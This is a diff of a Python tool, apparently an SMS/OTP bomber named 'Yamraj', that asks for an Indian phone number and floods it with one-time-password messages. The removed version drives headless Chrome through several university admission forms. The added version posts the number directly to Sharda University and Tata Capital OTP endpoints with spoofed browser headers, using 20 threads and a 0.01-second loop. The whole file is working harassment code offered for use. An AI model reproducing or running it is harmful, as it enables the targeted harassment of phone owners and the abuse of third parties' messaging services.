@@ -1,30 +1,17 @@
-"""You are free to use or copy this code, but please ensure the proper credit is given to the author"""
-
-    # AUTHOR : BASANT 
-    # INSTAGRAM : PSYCHOBASANT
-    # MAIL : MAIBASANTHOON@GMAIL.COM
-import os
-from selenium import webdriver
-import time
-from selenium.webdriver.common.by import By
-from selenium.webdriver.common.keys import Keys
-from concurrent.futures import ThreadPoolExecutor, wait
-from selenium.webdriver.chrome.options import Options
 import requests
-# browser = webdriver.Chrome()
-
-options = Options()
-options.add_argument("--headless=new")   # modern headless mode
-options.add_argument("--disable-gpu")
-options.add_argument("--window-size=1920,1080")
-# browser = webdriver.Chrome(options=options)
-
-# url1 = "https://admissions.aryacollege.in/"
-
+import os
+import sys
+import time
+from concurrent.futures import ThreadPoolExecutor
 from colorama import Fore
+
 RED = Fore.RED
 GREEN = Fore.GREEN
 CYAN = Fore.CYAN
+YELLOW = Fore.YELLOW
+Y = Fore.YELLOW
+C = Fore.CYAN
+G = Fore.GREEN
 
 def check_connection():
     try:
@@ -32,112 +19,130 @@ def check_connection():
          pass
     except:
         print(f"{RED}[-] {CYAN}No Internet connection !")
-        exit()
-def clear():
-    if os.name == "nt": 
-        os.system("cls")
-    else:
-        os.system("clear")
-clear()
+        sys.exit(0)
+check_connection()
+
 #ascii art
 print(f"""
-{RED}                                                                                     
-██  ██ ▄████▄ ██▄  ▄██ █████▄  ▄████▄    ██{CYAN} 
- ▀██▀  ██▄▄██ ██ ▀▀ ██ ██▄▄██▄ ██▄▄██    ██{GREEN}
-  ██   ██  ██ ██    ██ ██   ██ ██  ██ ████▀                                                                     
-                   {RED}       v 0.0.1
+{RED}
+██  ██ ▄████▄ ██▄  ▄██ █████▄  ▄████▄    ██
+ ▀██▀  ██▄▄██ ██ ▀▀ ██ ██▄▄██▄ ██▄▄██    ██
+  ██   ██  ██ ██    ██ ██   ██ ██  ██ ████▀
+{CYAN}──────────────────────────────────────────
+{GREEN}                v0.0.2
+""")
+print(f"""{C}
++----------------------------------+
+| {Y}Author    : {G}Basant{C}               |
+| {Y}Instagram : {G}psychobasant{C}         |
++----------------------------------+
 """)
 
-def details(x, y):
-    # browser = webdriver.Chrome(options=options)
-    y.get(x)
-    mail = y.find_element(By.XPATH, """//*[@id="Email"]""")
-    mail.send_keys("esjghjg2@aol.com")
-    number = y.find_element(By.XPATH, """//*[@id="Mobile"]""")
-    number.send_keys(target)
-    send_otp = y.find_element(By.XPATH, """//*[@id="otpverifylink_aMobile"]""").click()
-    print(f"{GREEN}[✔] {CYAN}otp sent")
+target = input(f"{RED}[-] {CYAN}Enter a number without (+91) {Y}:{G}")
 
-def sharda():
-    browser = webdriver.Chrome(options=options)
-    url = "https://www.shardauniversity.com/btech/?utm_source=Google_Search&utm_medium=cpc_Responsive_Btech&utm_campaign=2026-Addon-All-Programmes(S)&utm_keyword=btech%20university&gad_source=1&gad_campaignid=23328537989&gbraid=0AAAAADfFNq0kAOvqRuShpTtLEEcGPjuMQ&gclid=CjwKCAiAzOXMBhASEiwAe14SaWdIQmXi0EhGwNDww1DShLfVUko0Kg8YtOutzXVkTp7_AtcF4Gsa7xoCU2UQAvD_BwE"
-    # browser.get(url)
+url4 = "https://aweblms.sharda.ac.in/student-panel/api/common/sendRegOtp?utm_source=SU_Website&utm_medium=Header_Ticker&utm_campaign=SU_Admissions_2024"
+headers4 = {
+    "Host": "aweblms.sharda.ac.in",
+    "Content-Length": "1561",
+    "Sec-Ch-Ua": '"Chromium";v="127", "Not)A;Brand";v="99"',
+    "Accept": "application/json, text/plain, */*",
+    "Sec-Ch-Ua-Platform": '"Windows"',
+    "Accept-Language": "en-US",
+    "Sec-Ch-Ua-Mobile": "?0",
+    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.100 Safari/537.36",
+    "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryjTEgb3aizAIl76Ke",
+    "Origin": "https://medical.sharda.ac.in",
+    "Sec-Fetch-Site": "same-site",
+    "Sec-Fetch-Mode": "cors",
+    "Sec-Fetch-Dest": "empty",
+    "Referer": "https://medical.sharda.ac.in/",
+    "Accept-Encoding": "gzip, deflate, br",
+    "Priority": "u=1, i"
+}
+def sharda(target):
+    data = (
+        '------WebKitFormBoundaryjTEgb3aizAIl76Ke\r\n'
+        f'Content-Disposition: form-data; name="name"\r\n\r\n'
+        'Your Name Here\r\n'  # Replace with the actual name
+        '------WebKitFormBoundaryjTEgb3aizAIl76Ke\r\n'
+        f'Content-Disposition: form-data; name="email"\r\n\r\n'
+        'ehjehj@gmail.com\r\n'
+        '------WebKitFormBoundaryjTEgb3aizAIl76Ke\r\n'
+        f'Content-Disposition: form-data; name="mob"\r\n\r\n'
+        f'{target}\r\n'
+        '------WebKitFormBoundaryjTEgb3aizAIl76Ke\r\n'
+        f'Content-Disposition: form-data; name="state_id"\r\n\r\n'
+        'State ID Here\r\n'  # Replace with the actual state ID
+        '------WebKitFormBoundaryjTEgb3aizAIl76Ke\r\n'
+        f'Content-Disposition: form-data; name="plan_id"\r\n\r\n'
+        'Plan ID Here\r\n'  # Replace with the actual plan ID
+        '------WebKitFormBoundaryjTEgb3aizAIl76Ke--\r\n'
+    )
     try:
-        browser.get(url)
-        name = browser.find_element(By.XPATH, """//*[@id="pills-home"]/div[1]/div/div[2]/input""")
-        name.send_keys("Basant")
-        email = browser.find_element(By.XPATH, """//*[@id="pills-home"]/div[1]/div/div[3]/div/input""")
-        email.send_keys("fckrty@gmail.com")
-        course = browser.find_element(By.XPATH, """//*[@id="pills-home"]/div[1]/div/div[4]/div/select""")
-        course.send_keys("B")
-        # time.sleep(2)
-        state = browser.find_element(By.XPATH, """//*[@id="pills-home"]/div[1]/div/div[5]/div/select""")
-        state.send_keys("G")
-        city = browser.find_element(By.XPATH, """//*[@id="pills-home"]/div[1]/div/div[6]/div/select""")
-        city.send_keys("N")
-        number = browser.find_element(By.XPATH, """//*[@id="pills-home"]/div[1]/div/div[7]/div/input""")
-        number.send_keys(target)
-        send_otp = browser.find_element(By.XPATH, """//*[@id="pills-home"]/div[1]/div/div[7]/div/span/button""").click()
+        response = requests.post(url4, headers=headers4, data=data)
+        # print(f"Sharda API response: {response.text}")  # Log the response text
+        if response.status_code == 200:
+            print(f"{GREEN}[✔] {CYAN}otp sent")
+        else:
+            print(f"{RED}[✗] {CYAN}Rate limit!")
+    except:
+        print(f"{RED}[✗] {CYAN}Error!")
+# sharda(target)
+
+def tatacar(target):
+    url = "https://hlonline.tatacapital.com/APILayer/dlp/otp/services/generateOtp"
+
+    headers = {
+        "Host": "hlonline.tatacapital.com",
+        "Content-Length": "156",
+        "Sec-Ch-Ua-Platform": "\"Linux\"",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Accept": "application/json, text/plain, */*",
+        "Sec-Ch-Ua": "\"Not?A_Brand\";v=\"99\", \"Chromium\";v=\"130\"",
+        "Content-Type": "application/json",
+        "Sec-Ch-Ua-Mobile": "?0",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36",
+        "Origin": "https://www.tatacapital.com",
+        "Sec-Fetch-Site": "same-site",
+        "Sec-Fetch-Mode": "cors",
+        "Sec-Fetch-Dest": "empty",
+        "Referer": "https://www.tatacapital.com/",
+        "Accept-Encoding": "gzip, deflate, br",
+        "Priority": "u=1, i",
+    }
+
+    data = {
+        "mobileNumber": target,
+        "isNew": 1,
+        "deviceOs": "web",
+        "sourceName": "Bing_Search",
+        "subSourceName": None,
+        "webOsCapture": "Linux x86_64",
+        "deviceCapture": "Web"
+    }
+
+    try:
+        response = requests.post(url, headers=headers, json=data)
         print(f"{GREEN}[✔] {CYAN}otp sent")
     except:
-        print()
-    finally:
-        browser.quit()
-def amitu():
-    browser = webdriver.Chrome(options=options)
-    url = "https://noida.amity.edu/admissions-2026/btech/"
-    # browser.get(url)
+        print(f"{RED}[✗] {CYAN}Error!")
+# tatacar(target)
+def main():
+    tp = ThreadPoolExecutor(max_workers=20) #can fuck device less than 3GB RAM
+    stopped = False
     try:
-        browser.get(url)
-        name = browser.find_element(By.XPATH, """//*[@id="form"]/div[1]/input""")
-        name.send_keys("basant")
-        mail = browser.find_element(By.XPATH, """//*[@id="form"]/div[2]/div/input""")
-        mail.send_keys("lookup2@gmail.com")
-        number = browser.find_element(By.XPATH, """//*[@id="form"]/div[3]/div[2]/input""")
-        number.send_keys(target)
-        send_otp = browser.find_element(By.XPATH, """//*[@id="form"]/div[3]/div[3]/button""").click()
-        print(f"{GREEN}[✔] {CYAN}otp sent")
-    except:
-        print()
-    finally:
-        browser.quit()
-def nims():
-    browser = webdriver.Chrome(options=options)
-    url = "https://admission.nimsuniversity.org/"
-    try:
-       details(url, browser)
-    except:
-        print()
-    finally:
-        browser.quit()
-def muj():
-    browser = webdriver.Chrome(options=options)
-    url = "https://admissions.jaipur.manipal.edu/"
-    try:
-        details(url, browser)
-    except:
-        print()
-    finally:
-        browser.quit()
-def arya():
-    browser = webdriver.Chrome(options=options)
-    url = "https://admissions.aryacollege.in/"
-    try:
-        details(url, browser)
-    except:
-        print()
-    finally:
-        browser.quit()
-check_connection()
-target = input(f"[-] {CYAN}Enter a number without (+91) ")
-print(f"{GREEN}[+] {CYAN}Press Ctrl + C to stop")
-print("starting...")
-with ThreadPoolExecutor(max_workers=5) as executor:
-    while True: # infinite loop
-        f1 = executor.submit(sharda)
-        f2 = executor.submit(amitu)
-        f3 = executor.submit(nims)
-        f4 = executor.submit(muj)
-        f5 = executor.submit(arya)
-        wait([f1, f2, f3, f4, f5])
-        time.sleep(1)  
+        while True:
+            tp.submit(sharda, target)
+            tp.submit(tatacar, target)
+            time.sleep(0.01)
+
+    except KeyboardInterrupt:
+        if not stopped:
+            stopped = True
+            print("Stopping...")
+            tp.shutdown(wait=False, cancel_futures=True)
+            sys.exit(0)
+
+if __name__ == "__main__":
+    main()
+    
